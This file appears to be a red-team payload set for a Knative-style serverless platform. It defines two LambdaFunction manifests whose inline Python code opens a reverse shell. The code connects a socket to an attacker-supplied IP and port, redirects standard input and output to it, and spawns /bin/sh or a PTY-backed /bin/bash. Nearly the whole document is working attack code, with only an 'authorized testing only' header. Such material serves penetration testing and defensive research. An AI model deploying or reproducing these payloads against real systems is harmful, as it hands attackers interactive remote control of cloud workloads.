# Payload: Reverse Shell as LambdaFunction
# ⚠️ AUTHORIZED TESTING ONLY
#
# Establishes reverse shell connection to attacker server.
# Configure ATTACKER_IP and ATTACKER_PORT via environment variables.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-reverse-shell
  labels:
    redteam: "true"
    exploit: "payload-reverse-shell"
    category: "persistence"
    severity: "critical"
  annotations:
    redteam.knative.io/description: "Reverse shell payload - establishes connection to attacker"
    redteam.knative.io/expected-result: "Shell access on attacker machine"
spec:
  source:
    type: inline
    inline:
      code: |
        import socket
        import subprocess
        import os
        import sys
        
        def handler(event, context=None):
            """
            Reverse shell Lambda handler.
            
            Event payload:
              - attacker_ip: IP address of attacker server (required)
              - attacker_port: Port to connect to (default: 4444)
              - use_pty: Use PTY for better shell (default: false)
            """
            attacker_ip = event.get('attacker_ip') or os.environ.get('ATTACKER_IP')
            attacker_port = int(event.get('attacker_port') or os.environ.get('ATTACKER_PORT', '4444'))
            use_pty = event.get('use_pty', False)
            
            if not attacker_ip:
                return {"error": "attacker_ip required in event or ATTACKER_IP env var"}
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((attacker_ip, attacker_port))
                
                # Redirect stdin, stdout, stderr to socket
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                
                if use_pty:
                    import pty
                    pty.spawn("/bin/bash")
                else:
                    subprocess.call(["/bin/sh", "-i"])
                
                return {"status": "connection_closed"}
            except Exception as e:
                return {"error": str(e), "attacker_ip": attacker_ip, "attacker_port": attacker_port}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
  env:
    - name: ATTACKER_IP
      value: ""  # Set via event or override
    - name: ATTACKER_PORT
      value: "4444"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: payload-reverse-shell-pty
  labels:
    redteam: "true"
    exploit: "payload-reverse-shell"
    category: "persistence"
    severity: "critical"
    variant: "pty"
  annotations:
    redteam.knative.io/description: "Reverse shell with PTY for interactive sessions"
spec:
  source:
    type: inline
    inline:
      code: |
        import socket
        import os
        import pty
        
        def handler(event, context=None):
            """Reverse shell with PTY for better interaction"""
            attacker_ip = event.get('attacker_ip') or os.environ.get('ATTACKER_IP')
            attacker_port = int(event.get('attacker_port') or os.environ.get('ATTACKER_PORT', '4444'))
            
            if not attacker_ip:
                return {"error": "attacker_ip required"}
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((attacker_ip, attacker_port))
                
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                
                pty.spawn("/bin/bash")
                return {"status": "shell_spawned"}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
